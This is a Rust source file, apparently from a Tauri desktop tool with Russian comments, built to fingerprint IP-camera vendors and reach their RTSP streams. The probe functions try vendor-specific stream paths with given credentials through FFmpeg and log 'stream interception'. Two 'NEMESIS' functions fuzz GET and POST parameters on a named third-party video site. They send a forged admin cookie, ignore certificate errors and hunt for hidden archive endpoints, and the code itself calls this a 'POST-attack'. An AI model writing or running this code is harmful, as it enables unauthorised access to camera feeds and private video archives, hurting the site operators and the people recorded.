use std::process::Command;
use std::time::Duration;
use tauri::command;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

/// Сырой TCP-Снайпер: Стучится в порт 554 и вытаскивает вендора через RTSP OPTIONS
async fn fingerprint_rtsp_vendor(ip: &str) -> &'static str {
    let target = format!("{}:554", ip);

    // Даем 1.5 секунды на установку TCP-соединения
    let stream_result =
        tokio::time::timeout(Duration::from_millis(1500), TcpStream::connect(&target)).await;

    let Ok(Ok(mut stream)) = stream_result else {
        return "unknown"; // Порт закрыт или таймаут
    };

    // Формируем сырой RTSP-запрос (не требует авторизации)
    let req = format!(
        "OPTIONS rtsp://{}:554/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Lavf59.27.100\r\n\r\n",
        ip
    );

    if stream.write_all(req.as_bytes()).await.is_err() {
        return "unknown";
    }

    let mut buf = [0; 1024];
    // Даем 1 секунду на ответ от камеры
    let read_result =
        tokio::time::timeout(Duration::from_millis(1000), stream.read(&mut buf)).await;

    if let Ok(Ok(n)) = read_result {
        let response = String::from_utf8_lossy(&buf[..n]).to_lowercase();

        // Читаем заголовок Server из сырого ответа
        if response.contains("app-webs") || response.contains("hikvision") {
            return "hikvision";
        } else if response.contains("uc-httpd")
            || response.contains("xiongmai")
            || response.contains("dvr")
        {
            return "xmeye";
        }
    }

    "unknown"
}

/// Перебор (фаззинг) RTSP путей для поиска рабочего видеопотока
#[command]
pub async fn probe_rtsp_path(host: String, login: String, pass: String) -> Result<String, String> {
    let rtsp_host = crate::normalize_host_for_scan(&host);

    // 🕵️‍♂️ ЭТАП 1: TCP/RTSP Fingerprinting (Обход NAT и файрволов)
    let vendor = fingerprint_rtsp_vendor(&rtsp_host).await;

    println!(
        "[SPIDER] RTSP Разведка IP {}: Вендор = {}",
        rtsp_host, vendor
    );

    // 🎯 ЭТАП 2: Снайперский словарь (Ищем ЛЕГКИЕ Sub-Streams)
    let mut urls = Vec::new();

    match vendor {
        "hikvision" => {
            urls.push(format!(
                "rtsp://{}:{}@{}:554/Streaming/Channels/102",
                login, pass, rtsp_host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/Streaming/Channels/101",
                login, pass, rtsp_host
            ));
        }
        "xmeye" => {
            urls.push(format!(
                "rtsp://{}:{}@{}:554/cam/realmonitor?channel=1&subtype=1",
                login, pass, rtsp_host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/ch1/sub/av_stream",
                login, pass, rtsp_host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/live/ch01_1",
                login, pass, rtsp_host
            ));
        }
        _ => {
            urls.push(format!(
                "rtsp://{}:{}@{}:554/Streaming/Channels/102",
                login, pass, rtsp_host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/cam/realmonitor?channel=1&subtype=1",
                login, pass, rtsp_host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/ch1/sub/av_stream",
                login, pass, rtsp_host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/Streaming/Channels/101",
                login, pass, rtsp_host
            ));
        }
    }

    // 🚀 ЭТАП 3: Молниеносная проверка пути через FFmpeg
    let ffmpeg = crate::get_ffmpeg_path();
    for url in urls {
        let s = std::process::Command::new(&ffmpeg)
            .args(crate::ffmpeg::FfmpegProfiles::probe(&url))
            .status();

        if let Ok(status) = s {
            if status.success() {
                println!("[SPIDER] Успешный перехват потока: {}", url);
                return Ok(url);
            }
        }
    }

    Ok(format!(
        "rtsp://{}:{}@{}:554/Streaming/Channels/101",
        login, pass, rtsp_host
    ))
}

/// Фаззинг GET-параметров для поиска скрытых архивов (NEMESIS)
#[command]
pub async fn nemesis_fuzz_archive_endpoint(
    admin_hash: String,
    target_ftp_path: String,
) -> Result<Vec<String>, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let mut successful_hits = Vec::new();
    let endpoints = vec![
        "rtsp2mjpeg.php",
        "ajax.php",
        "test.php",
        "check.php",
        "get.php",
        "video.php",
        "archive.php",
        "stream.php",
        "api.php",
    ];
    let param_names = vec![
        "file",
        "path",
        "src",
        "video",
        "archive_path",
        "url",
        "id",
        "name",
        "target",
    ];

    for endpoint in endpoints {
        for param in &param_names {
            let url = format!(
                "https://videodvor.by/stream/{}?{}={}&get=1",
                endpoint, param, target_ftp_path
            );
            if let Ok(resp) = client
                .get(&url)
                .header("Cookie", format!("login=mvd; admin={}", admin_hash))
                .send()
                .await
            {
                let status = resp.status();
                let len = resp.content_length().unwrap_or(0);
                let ctype = resp
                    .headers()
                    .get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("");

                if status.is_success()
                    && (ctype.contains("video") || ctype.contains("octet-stream") || len > 500_000)
                {
                    successful_hits.push(format!("🎯 УСПЕХ (ВИДЕО): {}", url));
                } else if status.is_success() && len > 0 {
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
                        successful_hits.push(format!("💡 НАЙДЕН РЫЧАГ (ССЫЛКА): {}", url));
                    }
                }
            }
        }
    }
    if successful_hits.is_empty() {
        Ok(vec![
            "GET-сканирование завершено. Прямых точек входа не найдено.".to_string(),
        ])
    } else {
        Ok(successful_hits)
    }
}

/// Фаззинг POST-эндпоинтов
#[command]
pub async fn nemesis_fuzz_post_endpoints(
    admin_hash: String,
    target_ftp_path: String,
) -> Result<Vec<String>, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let mut successful_hits = Vec::new();
    let endpoints = vec![
        "ajax.php",
        "check.php",
        "get.php",
        "rtsp2mjpeg.php",
        "api.php",
        "video.php",
    ];
    let param_names = vec!["path", "file", "url", "target", "src"];
    let actions = vec!["download", "get_video", "fetch", "load", "archive"];

    for endpoint in endpoints {
        for param in &param_names {
            for action in &actions {
                let url = format!("https://videodvor.by/stream/{}", endpoint);
                let payload = [
                    (param.to_string(), target_ftp_path.clone()),
                    ("action".to_string(), action.to_string()),
                ];

                if let Ok(resp) = client
                    .post(&url)
                    .header("Cookie", format!("login=mvd; admin={}", admin_hash))
                    .header("X-Requested-With", "XMLHttpRequest")
                    .form(&payload)
                    .send()
                    .await
                {
                    let status = resp.status();
                    let len = resp.content_length().unwrap_or(0);
                    let ctype = resp
                        .headers()
                        .get("content-type")
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("");

                    if status.is_success() && (ctype.contains("video") || len > 500_000) {
                        successful_hits.push(format!(
                            "🎯 POST-УСПЕХ (ВИДЕО) в {} [{}={}&action={}]",
                            url, param, target_ftp_path, action
                        ));
                    } else if status.is_success() && len > 0 {
                        let body = resp.text().await.unwrap_or_default();
                        if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
                            successful_hits.push(format!(
                                "💡 POST-РЫЧАГ (ССЫЛКА) в {}: {}",
                                url,
                                &body.chars().take(150).collect::<String>()
                            ));
                        }
                    }
                }
            }
        }
    }
    if successful_hits.is_empty() {
        Ok(vec!["POST-атака завершена. Пусто.".to_string()])
    } else {
        Ok(successful_hits)
    }
}
